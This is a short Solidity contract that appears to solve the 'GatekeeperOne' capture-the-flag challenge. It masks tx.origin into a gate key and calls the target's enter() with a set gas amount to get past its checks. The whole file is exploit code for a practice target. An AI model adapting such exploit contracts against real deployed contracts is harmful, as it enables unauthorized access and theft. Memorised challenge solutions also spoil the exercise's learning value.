// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function entrant() external returns (address);
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneHack {
    address public _targetAddress;
    uint public _gas;
    constructor(address targetAddress, uint256 gas) payable {
        _targetAddress = targetAddress;
        _gas = gas;
    }

    function hack() public {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        IGatekeeperOne(_targetAddress).enter{gas: _gas}(gateKey);
    }
}
